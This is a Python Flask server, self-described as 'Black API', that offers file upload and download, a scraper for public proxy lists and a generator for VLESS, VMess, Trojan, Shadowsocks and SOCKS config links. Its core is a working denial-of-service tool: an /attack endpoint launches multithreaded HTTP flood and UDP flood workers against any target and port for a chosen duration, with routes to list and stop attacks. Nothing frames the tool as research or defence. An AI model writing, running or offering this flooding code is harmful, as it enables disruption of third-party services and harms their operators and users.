import os
import time
import random
import hashlib
import json
import base64
import uuid
import socket
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, send_file, jsonify
from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_FOLDER = 'storage'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs('configs', exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024

files_list = {}
active_attacks = {}
executor = ThreadPoolExecutor(max_workers=100)
proxies = []
proxy_index = 0

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
]

# ========== FILE ROUTES ==========
@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    name = secure_filename(f.filename)
    path = os.path.join(UPLOAD_FOLDER, name)
    f.save(path)
    files_list[name] = path
    return jsonify({'status': 'ok', 'file': name, 'url': f'/download/{name}'})

@app.route('/download/<name>')
def download(name):
    if name in files_list:
        return send_file(files_list[name], as_attachment=True)
    return jsonify({'error': 'Not found'}), 404

@app.route('/files')
def files():
    return jsonify(list(files_list.keys()))

@app.route('/delete/<name>', methods=['DELETE'])
def delete(name):
    if name in files_list:
        os.remove(files_list[name])
        del files_list[name]
        return jsonify({'status': 'deleted'})
    return jsonify({'error': 'Not found'}), 404

# ========== ATTACK ROUTES ==========
def http_flood(target, port, duration, threads):
    aid = hashlib.md5(f"{target}{time.time()}".encode()).hexdigest()[:8]
    active_attacks[aid] = {'target': target, 'type': 'HTTP', 'status': 'running'}
    def worker():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                s.send(f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: keep-alive\r\n\r\n".encode())
                s.close()
            except: pass
    for _ in range(threads):
        executor.submit(worker)
    return aid

def udp_flood(target, port, duration, threads):
    aid = hashlib.md5(f"udp{target}{time.time()}".encode()).hexdigest()[:8]
    active_attacks[aid] = {'target': target, 'type': 'UDP', 'status': 'running'}
    def worker():
        end = time.time() + duration
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        while time.time() < end:
            try: s.sendto(payload, (target, port))
            except: pass
    for _ in range(threads):
        executor.submit(worker)
    return aid

@app.route('/attack', methods=['POST'])
def attack():
    data = request.json
    target = data.get('target')
    port = int(data.get('port', 80))
    duration = int(data.get('duration', 60))
    method = data.get('method', 'http')
    threads = int(data.get('threads', 30))
    
    if method == 'http':
        aid = http_flood(target, port, duration, threads)
    elif method == 'udp':
        aid = udp_flood(target, port, duration, threads)
    else:
        return jsonify({'error': 'Method not supported'}), 400
    
    return jsonify({'attack_id': aid, 'target': target, 'port': port, 'duration': duration, 'method': method, 'status': 'launched'})

@app.route('/attack/stop/<aid>', methods=['POST'])
def stop_attack(aid):
    if aid in active_attacks:
        active_attacks[aid]['status'] = 'stopped'
        del active_attacks[aid]
        return jsonify({'status': 'stopped'})
    return jsonify({'error': 'Not found'}), 404

@app.route('/attacks')
def attacks():
    return jsonify(active_attacks)

# ========== PROXY ROUTES ==========
def load_proxies():
    global proxies
    sources = [
        'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    ]
    for url in sources:
        try:
            resp = requests.get(url, timeout=10)
            for p in resp.text.strip().split('\n'):
                p = p.strip()
                if p and ':' in p:
                    proxies.append({'http': f'http://{p}', 'https': f'http://{p}'})
        except: pass
    random.shuffle(proxies)

@app.route('/proxy')
def get_proxy():
    global proxy_index
    if not proxies:
        load_proxies()
    if not proxies:
        return jsonify({'error': 'No proxies'}), 404
    p = proxies[proxy_index % len(proxies)]
    proxy_index += 1
    return jsonify({'proxy': p})

@app.route('/proxy/count')
def proxy_count():
    return jsonify({'total': len(proxies)})

# ========== CONFIG ROUTES ==========
@app.route('/config', methods=['POST'])
def config():
    data = request.json
    protocol = data.get('protocol', 'vless')
    server = data.get('server')
    port = data.get('port', 443)
    
    if protocol == 'vless':
        uid = data.get('uuid', str(uuid.uuid4()))
        config = f"vless://{uid}@{server}:{port}?type=ws&path=/&encryption=none#{server}"
    elif protocol == 'vmess':
        uid = data.get('uuid', str(uuid.uuid4()))
        c = {"v": "2", "ps": server, "add": server, "port": port, "id": uid, "aid": "0", "net": "ws", "type": "none", "path": "/"}
        config = f"vmess://{base64.b64encode(json.dumps(c).encode()).decode()}"
    elif protocol == 'trojan':
        pw = data.get('password', 'password')
        config = f"trojan://{pw}@{server}:{port}?security=tls&type=tcp#{server}"
    elif protocol == 'shadowsocks':
        pw = data.get('password', 'password')
        method = data.get('method', 'aes-256-gcm')
        enc = base64.b64encode(f"{method}:{pw}".encode()).decode()
        config = f"ss://{enc}@{server}:{port}#{server}"
    elif protocol == 'socks':
        u = data.get('username', '')
        p = data.get('password', '')
        config = f"socks5://{u}:{p}@{server}:{port}" if u else f"socks5://{server}:{port}"
    else:
        return jsonify({'error': 'Protocol not supported'}), 400
    
    return jsonify({'protocol': protocol, 'config': config})

# ========== PING ==========
@app.route('/ping')
def ping():
    return jsonify({'status': 'pong', 'time': time.time()})

@app.route('/')
def index():
    return jsonify({
        'status': 'Black API Active',
        'routes': {
            'upload': 'POST /upload',
            'download': 'GET /download/filename',
            'files': 'GET /files',
            'attack': 'POST /attack',
            'attacks': 'GET /attacks',
            'proxy': 'GET /proxy',
            'config': 'POST /config',
            'ping': 'GET /ping'
        }
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)